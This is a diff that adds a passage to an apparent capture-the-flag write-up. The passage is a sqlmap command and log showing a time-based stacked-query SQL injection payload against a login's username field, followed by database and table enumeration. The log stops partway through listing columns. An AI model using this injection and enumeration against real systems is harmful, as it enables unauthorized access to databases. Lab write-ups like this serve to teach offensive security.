@@ -219,6 +219,86 @@ back-end DBMS: Microsoft SQL Server 2019
 
 ```
 
+```
+sqlmap -r req3.txt --schema --batch --force-ssl
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:29:26 /2026-09-30/
+
+[14:29:26] [INFO] parsing HTTP request from 'req3.txt'
+[14:29:26] [INFO] resuming back-end DBMS 'microsoft sql server' 
+[14:29:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: username=test';WAITFOR DELAY '0:0:5'--&password=test
+---
+[14:29:26] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2022 or 2016 or 10 or 2019 or 11
+web application technology: Microsoft IIS 10.0, PHP 7.2.26
+back-end DBMS: Microsoft SQL Server 2019
+[14:29:26] [INFO] enumerating database management system schema
+[14:29:26] [INFO] fetching database names
+[14:29:26] [INFO] fetching number of databases
+[14:29:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[14:29:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[14:29:47] [INFO] adjusting time delay to 1 second due to good response times
+6
+[14:29:48] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
+model
+[14:30:19] [INFO] retrieved: msdb
+[14:30:38] [INFO] retrieved: ST
+[14:31:23] [ERROR] invalid character detected. retrying..
+[14:31:23] [WARNING] increasing time delay to 2 seconds
+REAMIO
+[14:32:04] [INFO] retrieved: streamio_backup
+[14:33:59] [INFO] retrieved: tempdb
+[14:34:49] [INFO] retrieved: 
+[14:34:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:34:50] [INFO] fetching tables for databases: STREAMIO, model, msdb, streamio_backup, tempdb
+[14:34:50] [INFO] fetching number of tables for database 'streamio_backup'
+[14:34:50] [INFO] retrieved: 
+[14:34:50] [INFO] retrieved: 0
+[14:34:56] [INFO] fetching number of tables for database 'STREAMIO'
+[14:34:56] [INFO] retrieved: 2
+[14:35:02] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
+dbo.movies
+[14:36:35] [INFO] retrieved: dbo.users
+[14:37:23] [INFO] fetching number of tables for database 'msdb'
+[14:37:23] [INFO] retrieved: d3
+[14:37:31] [INFO] retrieved: 0
+[14:37:37] [INFO] fetching number of tables for database 'model'
+[14:37:37] [INFO] retrieved: 
+[14:37:37] [INFO] retrieved: 0
+[14:37:43] [INFO] fetching number of tables for database 'tempdb'
+[14:37:43] [INFO] retrieved: 0
+[14:37:48] [INFO] fetched tables: 'STREAMIO..movies', 'STREAMIO..users'
+[14:37:48] [INFO] fetching columns for table 'movies' in database 'STREAMIO'
+[14:37:48] [INFO] retrieved: 6
+[14:37:56] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
+id
+[14:38:17] [INFO] retrieved: 
+[14:38:29] [ERROR] invalid character detected. retrying..
+[14:38:29] [WARNING] increasing time delay to 3 seconds
+int
+[14:39:08] [INFO] retrieved: imdb
+[14:39:48] [INFO] retrieved: f
+[14:40:10] [ERROR] invalid character detected. retrying..
+[14:40:10] [WARNING] increasing time delay to 4 seconds
+
+
+```
+
 ---
 ## User Flag
 
